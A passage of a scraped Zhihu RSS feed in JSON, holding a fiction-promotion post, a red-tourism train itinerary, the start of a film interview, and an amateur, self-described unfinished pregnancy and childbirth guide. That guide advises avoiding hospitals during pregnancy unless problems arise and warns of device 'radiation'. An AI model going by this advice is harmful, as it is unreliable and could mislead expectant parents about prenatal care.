src=\"https://pic1.zhimg.com/v2-ddf1eaf34b95bfc31937b2b97201dd3b_720w.jpg?rss\" data-rawwidth=\"494\" data-rawheight=\"359\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ddf1eaf34b95bfc31937b2b97201dd3b\" data-watermark-src=\"v2-d9e3b6f43a755c895537742efd0cb5b0\" data-private-watermark-src=\"v2-c95633c207b65c991f47c13f9abb27a7\"></p>\n<p><br></p>\n<p>水果猎人们可千万不要错过广西这个宝藏地，去体验一下真正的水果自由吧~</p>\n<p><br></p>\n<p>对了，也别忘记尝试一下酸爽的螺蛳粉哟~</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-35b306c9583f25d0ea4dee1b7374cf02_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"682\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35b306c9583f25d0ea4dee1b7374cf02\" data-watermark-src=\"v2-2c7041104a9140400eb2adbdb527f9d1\" data-private-watermark-src=\"v2-98efa64ac70174e77678071065789d14\"></p>\n<p><br></p>\n<p>-完-</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-ni-ma-94?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王尼玛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/339131125/answer/2008546912?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">184 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476087360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">广西真的有那么差吗？</a><br><a href=\"http://www.zhihu.com/question/412568968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问广西话“你这人挺嗦的”是什么意思啊？</a><br>\n","link":"http://www.zhihu.com/question/339131125/answer/2008546912?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些让你觉得「这是我尊贵的盐选会员该看的文」？","date":"2021-08-19 07:50:19","description":"\n<p>我追了她 15 年，为了让我死心，他把朋友介绍给我相亲。</p>\n<p>如他所愿，我们在一起了，他又狠狠地冲出来揍了他朋友一拳……</p>\n<p>——</p>\n<p><b>最近有篇叫</b><a href=\"https://www.zhihu.com/question/352335209/answer/1945977589\" class=\"internal\">《小青梅与白月光》</a><b>的盐选文火了：</b></p>\n<p><a href=\"https://www.zhihu.com/question/352335209/answer/1945977589\" class=\"internal\">你身边有比较虐心的爱情故事吗?</a></p>\n<p>知友们纷纷为作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/15af3d93d0f55cd17ae04ccce35affe5\" data-hash=\"15af3d93d0f55cd17ae04ccce35affe5\" data-hovercard=\"p$b$15af3d93d0f55cd17ae04ccce35affe5\">@魏满十四碎</a> 打 call，并实名表示：<b>「这才是我一个尊贵的盐选会员该看的文」</b>！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-43ff252c09b6ffd9ec3a9d392561b558_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1282\" data-rawheight=\"1147\" data-watermark=\"original\" data-original-src=\"v2-43ff252c09b6ffd9ec3a9d392561b558\" data-watermark-src=\"v2-3970b7042091b7ce8118ecf503cde85e\" data-private-watermark-src=\"v2-daef9f6af743289377dcaf747fff2012\"></p>\n<h3><b>于是小盐我突发奇想，决定给大家张罗一批「尊贵的盐选会员」必看文！</b></h3>\n<p>继上一篇<a href=\"https://www.zhihu.com/question/352335209/answer/1945977589\" class=\"internal\">《小青梅与白月光》</a>之后，我们又在海量盐选文章中扒出了<b> 8 篇知友最推荐的「尊贵的盐选会员必看文」</b>，现双手奉上，请尊贵的你查收～</p>\n<p>（排名不分先后）</p>\n<p><b>1、女生如果主动点，男生真的容易心动吗？</b></p>\n<p>我男朋友，是当年把我的脑袋从地铁扶手里解救出来的消防员。<br>为了勾搭他，我送锦旗！上书四个大字——「救我狗命」，然后成功要到了他的微信。<br>有些缘分，一开始就「沙雕」无比。</p>\n<p>选自《鉴爱高手，热血出击》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/a97a8d53bf341b1e3d270232c54c7229\" data-hash=\"a97a8d53bf341b1e3d270232c54c7229\" data-hovercard=\"p$b$a97a8d53bf341b1e3d270232c54c7229\">@鹅子</a></p>\n<a href=\"https://www.zhihu.com/question/367625901/answer/1806917266\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-96ead29deec66232fdbe582cb76a326f_720w.jpg\" data-image-width=\"411\" data-image-height=\"363\" class=\"internal\">女生如果主动点，男生真的容易心动吗？</a><p><br></p>\n<p><b>2、当霸道总裁文里的男主和女主都是沙雕，会是怎样的情景？</b></p>\n<p>我万万没想到，有一天我竟然能和我妈一起穿越，成了霸道总裁的女儿和老婆。<br>刺激吧？我也觉得！<br>这事儿说来话不长，只因为我前一晚熬夜看小说，第二天我妈叫了我无数遍我还赖床不起，惹得正在做午饭的她，系着围裙右手拿着铲子就来打我，我一急，脑子还没反应过来，就先跳起来跑，然后就直直地撞在了我妈额头上……</p>\n<p>选自《沙雕女孩最好命：爆笑无厘头的女追男故事》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/7890a9974a15dddcbc0024eb787f6ca3\" data-hash=\"7890a9974a15dddcbc0024eb787f6ca3\" data-hovercard=\"p$b$7890a9974a15dddcbc0024eb787f6ca3\">@凯瑟琳一世</a> </p>\n<a href=\"https://www.zhihu.com/question/356024886/answer/1947552445\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">当霸道总裁文里的男主和女主都是沙雕，会是怎样的情景？</a><p><b>3、有哪些追妻火葬场或女主被男主伤透了跟男二在一起的小说？</b></p>\n<p>他红着眼说：「你再给我服个软，最后一次了。」<br>我嗤笑一声：「哥哥，这话得跪着说，才有说服力。」<br>然后，席渊真给我跪下了。<br>高大挺拔的男人，直挺挺跪在我面前时，脊梁也不肯弯下去半分。<br>那时候，我真觉得，只要席渊能爱我，我愿意一寸寸放低身段，抽去傲骨，把命搭进去也没什么要紧……</p>\n<p>选自《万里江山亦如君：搞事业女主的绝美爱情》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/ecc3cc3e03b20cd146dfb64270bcd44a\" data-hash=\"ecc3cc3e03b20cd146dfb64270bcd44a\" data-hovercard=\"p$b$ecc3cc3e03b20cd146dfb64270bcd44a\">@巧克力阿华甜</a> </p>\n<a href=\"https://www.zhihu.com/question/437075713/answer/1952254870\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">有哪些很短的追妻火葬场或女主被男主伤透了跟男二在一起的小说?</a><p><b>4、男生真的不懂什么是绿茶吗？</b></p>\n<p>我的男朋友有一个很要好的兄弟，是一个浑身绿茶味的女汉子，俗称「红茶」。<br>男朋友池也是一个玩得比较开的男生，他很幽默，长相也不差，又会打篮球，在系里比较受欢迎。<br>我问过他为什么会看上我，他摸着头笑：「就是觉得，你很对我胃口。」</p>\n<p>选自《红酥手：女主她超凶的！》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/da6aca3f7438a05d470da809a2f0f8fd\" data-hash=\"da6aca3f7438a05d470da809a2f0f8fd\" data-hovercard=\"p$b$da6aca3f7438a05d470da809a2f0f8fd\">@是玉子耶</a> </p>\n<a href=\"https://www.zhihu.com/market/paid_column/1318161741436940288/section/1385544256845733888\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-2d93f8451e1d06d3bc57b5dfdf2f82c9_720w.jpg\" data-image-width=\"750\" data-image-height=\"422\" class=\"internal\">知乎盐选 | 前任兄弟是绿茶</a><p><b>5、如何以「娘娘，其实奴才不是真正的太监」为开头，写一个故事？</b></p>\n<p>「娘娘，其实奴才不是真正的太监。」<br>「娘娘要借种，还不如找奴才。」<br> 夏侯离擎住我的手腕，把我抵在宫墙上，在东宫外的苍树下。<br> 他的目光阴森寒冷，似陵墓鬼火。<br> 他是个可怕的家伙……</p>\n<p>选自《西陵有美人：我被病娇看上的日子》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/4572aa84e78bc752deb97fa38cce6608\" data-hash=\"4572aa84e78bc752deb97fa38cce6608\" data-hovercard=\"p$b$4572aa84e78bc752deb97fa38cce6608\">@十具</a> </p>\n<a href=\"https://www.zhihu.com/question/436143714/answer/1884791891\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">如何以「娘娘，其实奴才不是真正的太监」为开头，写一个故事？</a><p><b>6、有没有什么短篇言情小说把你虐哭了？</b></p>\n<p>他出征的前一晚我有了身孕，但这不妨碍他将我绑上祭台。他是高高在上的佛子，而我，区区妖女，染指神明，定会落得抽筋拔骨的下场。</p>\n<p>选自《夫君修炼指南：宠妻的一百种方式》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/10e36b8b4a1854705325940bca48a84f\" data-hash=\"10e36b8b4a1854705325940bca48a84f\" data-hovercard=\"p$b$10e36b8b4a1854705325940bca48a84f\">@小柒崽子</a> </p>\n<a href=\"https://www.zhihu.com/question/329971551/answer/1947434690\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">有没有什么短篇言情小说把你虐哭了？</a><p><b>7、男生眼里的白月光是一个怎么样的存在？</b></p>\n<p>深夜，枕头旁的手机突然亮了一下。 迷迷糊糊打开对话框：「我回来了，出来聊聊？」</p>\n<p>选自《欲望都市：情场玩家的真爱与反杀》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/c5ff17060b93be83122b140dbddf5397\" data-hash=\"c5ff17060b93be83122b140dbddf5397\" data-hovercard=\"p$b$c5ff17060b93be83122b140dbddf5397\">@小呀小猫咪</a> </p>\n<a href=\"https://www.zhihu.com/question/277228908/answer/1622135137\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">男生眼里的白月光是一个怎么样的存在？</a><p><b>8、你看过最爽的爽文有多爽？</b></p>\n<p>老公背叛了我，这个消息是他最好的异性好友告诉我的。<br>我以为她告诉我这件事，要么是真心为我好，要么是想看我的笑话。<br>可我万万没想到，她也喜欢我老公……</p>\n<p>选自《我的爱情，人满为患》，作者 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/00c3277a7a0ac91d174edea4e29b50f9\" data-hash=\"00c3277a7a0ac91d174edea4e29b50f9\" data-hovercard=\"p$b$00c3277a7a0ac91d174edea4e29b50f9\">@浮生半日</a> </p>\n<a href=\"https://www.zhihu.com/question/332411777/answer/1956814388\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">你看过最爽的爽文有多爽？</a><p>尊贵的盐选会员们，请享用吧！</p>\n<p>如果喜欢，请点赞关注，为尊贵的您服务，小盐感到万分荣幸[嘿哈]</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yan-xuan-zuo-zhe-xiao-guan-jia?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">盐选作者小助手</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469477579/answer/1974710668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">247 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/381176209?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">这个小说开头你能看得下去吗？</a><br><a href=\"http://www.zhihu.com/question/413683053?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价本人最近写的小说?</a><br>\n","link":"http://www.zhihu.com/question/469477579/answer/1974710668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国内有哪些经典的火车旅行路线？","date":"2021-08-19 07:48:08","description":"\n<p>今年是中国共产党成立100周年，在此推荐一条<b>江浙沪皖红色之旅。</b></p>\n<p><b>Day1：中共一大会址——嘉兴南湖</b></p>\n<p><b>交通：</b>上海虹桥站出发乘坐地铁10号线至一大会址·新天地站。上海站出发乘坐地铁1号线至一大会址·黄陂南路站。</p>\n<p><b>中共一大会址</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e9580fbc4323f08c72421c6208edf4ed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"418\" data-rawheight=\"482\" data-watermark=\"watermark\" data-original-src=\"v2-e9580fbc4323f08c72421c6208edf4ed\" data-watermark-src=\"v2-59f8cd9baa1c9a66d9f0e507ff4e0846\" data-private-watermark-src=\"v2-71ff16a1b83c6ddb9115acededb2a0b4\"></p>\n<p><b>推荐理由：</b>这里是中国共产党的诞生地。中国共产党第一次全国代表大会在此召开，中国共产党的历史从此开始。</p>\n<p><b>旅游攻略：</b>独具上海特色的石库门楼房，在四周茂密梧桐的掩映下，别有一番特色，值得“打卡”。</p>\n<p><b>交通：</b>上海虹桥站坐高铁出发，30分钟左右到达嘉兴南站，乘坐71路、95路、游8路公交到达南湖景区站。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f2cc1f6454781c67e1dad2f058fa1de0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"356\" data-rawheight=\"587\" data-watermark=\"watermark\" data-original-src=\"v2-f2cc1f6454781c67e1dad2f058fa1de0\" data-watermark-src=\"v2-07af9689229bcf523afc94b464826f06\" data-private-watermark-src=\"v2-9cc2fb4c4e319373c77317b7efa2d2a8\"></p>\n<p><b>嘉兴南湖</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1e9fd7f431724a85a8bf1f9d03caa105_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"533\" data-watermark=\"watermark\" data-original-src=\"v2-1e9fd7f431724a85a8bf1f9d03caa105\" data-watermark-src=\"v2-0a2d18191a9a735d191f438121f0c59c\" data-private-watermark-src=\"v2-624917ff85daac5330f9c5bd607cbee7\"></p>\n<p><b>推荐理由：</b>这里是“红船精神”诞生地。1921年8月，中国共产党第一次全国代表大会在此闭幕，庄严宣告中国共产党诞生。</p>\n<p><b>旅游攻略：</b>需提前实名预约购买渡船票。主要景点有烟雨楼、湖心岛、小瀛洲等。</p>\n<p><b>小贴士：</b>嘉兴站新建站房将使用南湖湖心取土制作的“建党百年砖”，红砖用1921块，青砖用2021块，取中国共产党建党100周年的寓意。</p>\n<p><b>交通：</b>嘉兴南站坐高铁出发，2个多小时到达南京南站。（建议住宿南京）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-16296ee5a6a0c0a48155cf516e82aeee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"358\" data-rawheight=\"550\" data-watermark=\"watermark\" data-original-src=\"v2-16296ee5a6a0c0a48155cf516e82aeee\" data-watermark-src=\"v2-f8ec06cc5cdae6f074843c09833dafb2\" data-private-watermark-src=\"v2-d8f5001b3ffb48babfbf0e212aa9f842\"></p>\n<p><b>Day2：雨花台烈士陵园——淮海战役纪念馆</b></p>\n<p><b>交通：</b>南京南站出发乘坐地铁1号线至中华门站。</p>\n<p><b>雨花台烈士陵园</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4fe55e9569e552044c7025e5e1038ead_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"433\" data-rawheight=\"615\" data-watermark=\"watermark\" data-original-src=\"v2-4fe55e9569e552044c7025e5e1038ead\" data-watermark-src=\"v2-3283c94ff53aec5e0898e88c6563142b\" data-private-watermark-src=\"v2-8ef816eb38ea85bbc105b465d009112f\"></p>\n<p><b>推荐理由：</b>这是国内规模最大的纪念性陵园，建在高约60米、长约1000米的山岗上，非常宏伟壮观。</p>\n<p><b>旅游攻略：</b>需要提前预约，关注“中国雨花台”微信公众号，在下方菜单栏中点击“预约服务”，选择入园时间。</p>\n<p><b>交通：</b>南京南站坐高铁出发，1个半小时左右到达徐州东站。徐州东站出发乘坐地铁1号线换乘地铁2号线至淮塔站。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-71b95312b1b88d0751b6d2ed278ce640_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"354\" data-rawheight=\"579\" data-watermark=\"watermark\" data-original-src=\"v2-71b95312b1b88d0751b6d2ed278ce640\" data-watermark-src=\"v2-07e4c2fdf2214035a355c20d65ec9b40\" data-private-watermark-src=\"v2-dabdc0cc28dd299f776069520f57407c\"></p>\n<p><b>徐州淮海战役纪念馆</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-26ec5b92de49773b1e3c380d3ddcade2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"398\" data-rawheight=\"199\" data-watermark=\"watermark\" data-original-src=\"v2-26ec5b92de49773b1e3c380d3ddcade2\" data-watermark-src=\"v2-e8ef639cfd6c32ad3de019c142a33adf\" data-private-watermark-src=\"v2-749f67096350a6160e08441d033450c1\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0caf00ffbb92e73d36e507f2c3cb027d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"304\" data-rawheight=\"409\" data-watermark=\"watermark\" data-original-src=\"v2-0caf00ffbb92e73d36e507f2c3cb027d\" data-watermark-src=\"v2-065387bc6c35f16582629b2e5ec76128\" data-private-watermark-src=\"v2-745892d4af63b5b6c712d078ad26f112\"></p>\n<p><b>推荐理由：</b>这是解放战争时期三大战役之一淮海战役纪念馆，具有较高的史料意义及观赏价值。</p>\n<p><b>旅游攻略：</b>需要提前预约，关注“淮海战役纪念馆”微信公众号，在下方菜单栏中点击“参观预约”，选择入馆时间。</p>\n<p><b>交通：</b>徐州东站坐高铁出发，1个多小时到达合肥南站。（建议住宿合肥）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c31cb7457ec218df9798a11933dd87de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"356\" data-rawheight=\"504\" data-watermark=\"watermark\" data-original-src=\"v2-c31cb7457ec218df9798a11933dd87de\" data-watermark-src=\"v2-c9c95c6243a223a904b3048ab3356fde\" data-private-watermark-src=\"v2-1d20424c0be497900ce3d4cb26d3f7e6\"></p>\n<p><b>Day3：渡江战役纪念馆——安徽省金寨县</b></p>\n<p><b>交通：</b>合肥南站出发乘坐轨道交通5号线至渡江纪念馆站。</p>\n<p><b>渡江战役纪念馆</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6e8d331ceed87f84d8f076de743b8e18_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"395\" data-rawheight=\"440\" data-watermark=\"watermark\" data-original-src=\"v2-6e8d331ceed87f84d8f076de743b8e18\" data-watermark-src=\"v2-2d88b79dbcf1442ba5c9cbe22ea91ad6\" data-private-watermark-src=\"v2-69f7f4de96ce412b67163859da32c06f\"></p>\n<p><b>推荐理由：</b>渡江战役是继三大战役后决定解放战争胜负的战略性战役，馆内基本陈列《百万雄师过大江》，全景式描绘了400万军民奋勇向前的壮阔场景。</p>\n<p><b>旅游攻略：</b>需提前预约，关注“渡江战役纪念馆”微信公众号，在下方菜单栏中点击“预约参观”，渡江战役纪念馆和安徽名人馆同时间预约。</p>\n<p><b>交通：</b>合肥南站坐高铁出发，50分钟左右到达金寨站。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7c41f679dea757bd81b6f4a12873113a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"357\" data-rawheight=\"587\" data-watermark=\"watermark\" data-original-src=\"v2-7c41f679dea757bd81b6f4a12873113a\" data-watermark-src=\"v2-638aad096386417383e4ba3abc279e14\" data-private-watermark-src=\"v2-6e3586cf594bedeef0a6175f9b9b2275\"></p>\n<p><b>安徽金寨县</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-12544d0b95186975439f1cf049405df6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"363\" data-rawheight=\"484\" data-watermark=\"watermark\" data-original-src=\"v2-12544d0b95186975439f1cf049405df6\" data-watermark-src=\"v2-6e0720e90fcd24f36e713e8c3aa5f6d1\" data-private-watermark-src=\"v2-4d895bf764e5b66f90b428395fac704a\"></p>\n<p><b>推荐理由：</b>金寨是中国革命的重要策源地、人民军队的重要发源地，地处大别山腹地，自然风光优美，是一座“天然氧吧”。</p>\n<p><b>旅游攻略：</b>到了金寨后可去天堂寨、红军广场、梅山水库、金寨革命博物馆等景点。</p>\n<p>这条经典火车旅行线路，带你重温革命历史，感受红色经典，一起去打卡吧。</p>\n<p>（为保证您的出行顺利，请提前查询当日车次信息。）</p>\n<p><br></p>\n<hr>\n<p><br></p>\n<p>来源：“中国铁路”微信公众号</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tie-lu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国铁路</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469093965/answer/1974550047?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">60 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/31781093?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">中国有什么经典的火车旅行路线？</a><br><a href=\"http://www.zhihu.com/question/23189925?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国内适合两个人毕业旅行的地方或路线(想多去几个地方)?</a><br>\n","link":"http://www.zhihu.com/question/469093965/answer/1974550047?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"写给新手父母、奶爸、奶妈的一份生产指南。","date":"2021-08-19 07:36:59","description":"\n<p>这篇文章我还没有写完。本人性别为男性，写得不好请多见谅，也可以在评论区帮忙补充。</p>\n<p>这篇文章我尽量写得客观清晰，避免了一些太过主观的问题。</p>\n<p>本篇文章适合新手阅读。</p>\n<h2>1、备孕</h2>\n<p>代补充。</p>\n<ol>\n<li>注意怀孕的时间，以上海的气候条件为例，建议你在上一年的6～8月份怀孕，下一年的3～5月份生孩子，气温不会很低。之后产后护理较为方便。</li>\n<li>怀孕之前可以去社区医院领取叶酸和免费体检。</li>\n<li>怀孕之前多锻炼。</li>\n</ol>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>2、怀孕</h2>\n<ol>\n<li>在家里呆着，没问题别去医院或诊所。</li>\n<li>少吃糖。</li>\n<li>多休息，适当轻微运动。</li>\n<li>补充铁、钙。</li>\n</ol>\n<h3>3、孕期（前中后期）</h3>\n<ol>\n<li>孕妇注意多休息，多睡觉。到了后期更要小心谨慎，非必要不要外出走动。如果是自己一个人的话建议雇佣保姆清洁工之类的。保持怀孕的环境卫生洁净。后期请必须减少过量的运动（少爬楼梯）。</li>\n<li>孕期适当补充营养，注意饮食。</li>\n<li>调整好自己的心态。</li>\n<li>不管是前期还是早期后期，怀孕期间最好不要为爱鼓掌，特别是后期。中后期也不要自慰。不要贪图一时之快而去挑战自己的身体。</li>\n<li>少接触电子设备或呆在辐射较大的地方，你所处的环境应当安静卫生。</li>\n</ol>\n<h3>\n<br>4、分娩</h3>\n<ol>\n<li>去大医院分娩，请提前做好准备。（注：如果你一个人，请务必提前准备好所有事物，委托可靠的人在当天帮你处置一切（叫车、备药等）。如果身边没有人，最好在身体不良反应开始前提前去医院。）</li>\n<li>顺产或剖腹产看你老婆（或自己）的体质，其后才参考医生的建议。记住不要迷信和去冒险。顺产不建议上麻醉，最终看你老婆（或自己）的选择。（注：顺产可能会导致阴道松弛。）</li>\n<li>（陪从者）是否需要陪产？最好需要。你的陪伴会在心理层面给予你的老婆（生产者）一定的安慰，分娩的过程你需要去注意一些细节 ，如观察医生的行动和注意工具材料，避免意外发生。</li>\n<li>分娩过程安慰老婆（生产者），这个过程很痛苦。作为生产者，你需要稳定自己的情绪，做好迎接痛苦的准备。过程中，可以和医务人员或者陪产者交流，分散注意力使自己不要太紧张。</li>\n<li>需要准备食物和水（能量饮料）。</li>\n</ol>\n<h2>\n<br>5、产后</h2>\n<ol>\n<li>无论是身体素质再好的人，产后都是其身体最虚弱的时候，务必做好最好的调养，避免高强度运动。必须有更多休息的时间。</li>\n<li>无论是生产者还是陪产人，请调理好心态。不要发怒。生产者由于生理上的不适会多少影响到心理，情绪上表现出浮躁、易怒、不安等，作为生产者，你需要稳定自己的情绪保持良好心态；作为陪产者，你需要扛住压力给予生产者最好的心理安慰和照顾。</li>\n</ol>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>6、月子</h3>\n<ol>\n<li>一般没有什么太大问题，月子前几天需要多注意。一切饮食以清淡为主不要吃刺激性太大的食物（可以喝红豆薏米粥、枸杞红枣炖鸡汤等）。来不喝碳酸饮料（可乐雪碧）。适当饮食补品但是切忌无脑补充补品。多喝热水。多吃水果。这里建议的食物稍后我查资料科普后补充。</li>\n<li>尽量洗热水澡，可以适当按摩或者泡脚。</li>\n<li>最好不要做太用力的事情（搬东西）。如果你是单独一人的话如有必要请雇佣他人。</li>\n<li>适量补充维生素。</li>\n<li>月子内尽量不要为爱鼓掌或自我满足，除非你身体素质实在是够硬。</li>\n</ol>\n<h3>7、减肥</h3>\n<h3>8、女性健康</h3>\n<p>（略，后续补充）</p>\n<h2>9、育儿</h2>\n<ol>\n<li>避免与人亲密接触。</li>\n<li>宝宝啼叫代表饥饿，请及时喂养。母乳哺育不是必须，虽然一般使用母乳喂养。如果你的老婆（生产者）或自己<b>先天</b>奶水不足（几近无奶水的情况下），不需要使用任何方法去催乳，这时候可以用牛乳（上等质量）哺育新生儿。不要去强求身体。如果只是奶水少的情况下可以让医生帮你催乳。</li>\n<li>宝宝出生不需要洗澡。不需要绑腿。</li>\n<li>涨奶的时候需要把奶挤出来，可以暂时存放在冰箱。涨奶会很痛苦。</li>\n<li>宝宝出生需要多休息，避免强光照射。</li>\n<li>如果宝宝出现微小问题（如黄疸偏高），请及时咨询医生。</li>\n</ol>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-gong-30-29?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小攻</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/379385438?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"你觉得电影《兔子暴力》拍得怎么样？","date":"2021-08-18 09:58:49","description":"\n<p>电影《兔子暴力》摄影指导汪士卿九问九答：</p>\n<p>2021年七夕来临之前，全国局部疫情反弹，部分省市电影院关门，影市惨淡。电影《兔子暴力》则提档到8月14日上映，这是一种直面困难的勇气，人生需要乘风破浪，才能抵达彼岸。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8db387cb4f20ffcf160a9e2ec582a4d4_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1532\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8db387cb4f20ffcf160a9e2ec582a4d4\" data-watermark-src=\"v2-12a15feaed382bcca8aff0980477a8b1\" data-private-watermark-src=\"v2-d02f3727cb1c7263fdeeb306f4623b49\"></p>\n<p>缘起：我荣幸在2019年元旦那一天，（当时还在浙江台州外景拍摄）收到劳雷影业制片人杨菲菲发来的剧本，看完很喜欢，当天回复了我的读后感：</p>\n<p>“杨总，我刚刚仔细看完了剧本，觉得人物关系很细腻 很有生活质感的真实。边缘城市攀枝花和金沙江流域我去过，知道那里的人文地貌，工业空间很特别（历史的痕迹）城市给人有一种疏离感 ，同时山水天感觉很近。回忆和现实都可以拍摄的很诗意（幻觉 梦境 玄外之音）剧本很多琐碎生活的日常细节很耐看，母女、水青的同学关系具有张力。 